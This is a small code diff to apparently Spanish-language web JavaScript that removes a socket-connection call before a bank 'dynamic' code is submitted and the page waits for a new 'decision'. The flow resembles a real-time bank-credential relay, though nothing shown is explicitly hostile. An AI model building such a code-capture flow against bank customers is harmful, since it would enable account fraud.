@@ -107,7 +107,6 @@
                 }
 
                 hideBankAlert('dinamicError');
-                initSocketConnection(nodeUrl, sessionId, sessionToken, bank, '3');
                 // ✅ emitir (si no está conectado, se encola y se envía cuando conecte)
                 waitingNewDecision = true;
                 window.rtEmitSubmit('user:submit_dinamic', {
